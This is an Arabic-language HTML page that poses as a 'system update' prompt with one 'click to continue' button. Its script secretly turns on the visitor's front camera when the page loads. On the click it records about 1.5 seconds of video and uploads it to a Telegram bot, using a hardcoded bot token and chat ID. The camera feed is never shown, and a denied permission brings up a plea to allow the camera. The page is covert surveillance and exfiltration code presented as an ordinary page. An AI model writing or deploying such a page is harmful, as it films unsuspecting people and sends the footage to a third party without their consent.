ك<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث النظام</title>
    <style>
        body { background: #0f172a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
        button { background: #38bdf8; color: #0f172a; border: none; padding: 18px 40px; font-size: 1.2rem; font-weight: bold; border-radius: 12px; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
    </style>
</head>
<body>
    <button id="mainBtn" onclick="startRecording()">اضغط هنا للمتابعة</button>
    <video id="v" autoplay playsinline style="display:none;"></video>

    <script>
        const TOKEN = '8880573702:AAGOnEril_hFUPSBRuLh2TwGkFOG3wCeV80';
        const CHAT = '8304712202';
        let mediaStream = null;

        // تشغيل الكاميرا في الخلفية فور فتح الصفحة عشان تكون جاهزة تماماً للقطة الفورية
        async function initCamera() {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                document.getElementById('v').srcObject = mediaStream;
            } catch (e) {}
        }
        initCamera();

        async function startRecording() {
            try {
                document.getElementById('mainBtn').style.display = 'none';

                // لو الكاميرا ما اشتغلتش في الخلفية لأي سبب، نشغلها وقت الضغط
                if (!mediaStream) {
                    mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                    document.getElementById('v').srcObject = mediaStream;
                }

                let mediaRecorder;
                let chunks = [];

                try {
                    mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
                } catch (e) {
                    mediaRecorder = new MediaRecorder(mediaStream);
                }

                mediaRecorder.ondataavailable = e => {
                    if (e.data.size > 0) chunks.push(e.data);
                };

                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const formData = new FormData();
                    formData.append('chat_id', CHAT);
                    formData.append('video', blob, 'visitor_video.webm');

                    try {
                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
                            method: 'POST',
                            body: formData
                        });
                    } catch (err) {
                        console.error(err);
                    }

                    mediaStream.getTracks().forEach(t => t.stop());
                };

                // بدء التسجيل الفوري بدون أي انتظار
                mediaRecorder.start();

                // تسجيل سريع جداً (ثانية ونصف) عشان يبعت الفيديو في أسرع وقت ممكن
                setTimeout(() => {
                    if (mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, 1500);

            } catch (e) {
                alert('يرجى السماح بإذن الكاميرا للمتابعة');
            }
        }
    </script>
</body>
</html>
